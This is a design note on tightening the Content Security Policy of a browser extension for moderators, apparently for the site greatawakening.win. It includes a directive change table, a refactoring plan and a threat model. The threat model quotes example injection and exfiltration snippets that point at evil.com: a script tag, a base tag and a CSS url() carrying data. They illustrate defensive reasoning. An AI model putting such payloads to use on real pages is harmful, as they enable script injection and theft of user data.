# CSP Tightening — GAW ModTools Extension

## Current State (v10.11)

The manifest `content_security_policy.extension_pages` value as shipped in v10.11:

```
script-src 'self';
object-src 'none';
base-uri 'self';
connect-src 'self' https://gaw-mod-proxy.gaw-mods-a2f2d0e4.workers.dev https://greatawakening.win https://*.greatawakening.win;
img-src 'self' data: https://greatawakening.win https://*.greatawakening.win;
style-src 'self' 'unsafe-inline';
font-src 'self';
```

The popup.html `<meta http-equiv="Content-Security-Policy">` (applied at document
level in the popup itself) mirrors connect-src to the single worker endpoint.

## v10.11 Tightening (REDTEAM-3, this ship)

Changes from v10.10 baseline:

| Directive | Before | After | Reason |
|---|---|---|---|
| `object-src` | `'self'` | `'none'` | No plugins/applets used; 'none' is the stricter default |
| `connect-src` | absent | pinned to worker + GAW | Restricts where popup/SW can fetch; blocks exfil to arbitrary hosts |
| `img-src` | absent | `'self' data: GAW` | Allows mod avatars and post thumbnails; data: for inline base64 icons |
| `font-src` | absent | `'self'` | JetBrains Mono webfont loaded from extension bundle |
| `style-src 'unsafe-inline'` | absent (implicit) | explicit + retained | See v10.12 note below |

## v10.12 Plan: Remove `unsafe-inline` from `style-src`

`style-src 'unsafe-inline'` is intentionally retained in v10.11. Removing it
requires refactoring 38+ inline `style.cssText` assignment sites in `popup.js`
and related JS, tracked as BACKLOG TS-2.

Migration path:
1. Audit all `style.cssText` / `.style.property =` assignments in popup.js (TS-2).
2. Move dynamic styles to CSS custom properties (`--var`) toggled by data attributes
   or class swaps — eliminates the need for inline style mutation.
3. Consolidate remaining one-off styles into `popup.css` rule blocks.
4. Once all 38+ sites are refactored, drop `'unsafe-inline'` from `style-src`.
5. Verify in Chrome DevTools: load popup, check Security panel for CSP violations.

Estimated effort: 2-3 sessions (medium refactor, no functional changes).

## Threat Model

### What this CSP protects against

- **Script injection via compromised dependencies or XSS in popup.js**: `script-src 'self'`
  means only scripts loaded from the extension bundle can run. An injected
  `<script src="https://evil.com/payload.js">` is blocked.
- **Data exfiltration via fetch/XHR to attacker-controlled hosts**: `connect-src`
  restricts outbound connections to the GAW worker and GAW itself. A payload that
  tries to POST stolen token data to a third host is blocked.
- **Plugin/applet exploitation**: `object-src 'none'` kills the entire attack surface
  of Flash, Java, and legacy plugin-based exploits.
- **Base tag injection**: `base-uri 'self'` prevents an attacker from injecting a
  `<base href="https://evil.com">` that would redirect all relative resource loads.

### What this CSP does NOT protect against

- **Inline event handlers in HTML**: The popup uses JS-added handlers, not HTML
  `onclick=` attributes, so this isn't a live surface — but it's worth auditing.
- **Style-based data exfiltration**: CSS `background: url(https://evil.com?data=X)`
  is partially blocked by `img-src`, but `style-src 'unsafe-inline'` still allows
  inline style injection if an XSS payload can write to `element.style`. This is
  the main residual risk until TS-2 lands.
- **Compromised extension bundle**: If the extension's own JS files are tampered
  with (e.g., via a supply-chain attack on build artifacts), CSP cannot help — that
  code runs as `'self'`.
- **Service Worker scope**: The SW has its own CSP context; `connect-src` in
  `extension_pages` applies to the popup page, not the SW. The SW's outbound
  fetch is governed by `host_permissions`, not CSP. This is a Chrome MV3 limitation.

## CSP Violation Reporting (deferred)

Chrome MV3 extensions do not support a built-in `report-uri` / `report-to` CSP
endpoint the way web pages do. To capture CSP violations:

- **REDTEAM-1 dependency**: Add a `securitypolicyviolation` event listener in
  `popup.js` that sends violation details to the worker's `/mod/diag` endpoint.
  This gives visibility into any violations that fire in the wild.
- Until that lands, violations are only visible in the Chrome DevTools console
  (Extensions > Inspect popup > Console).
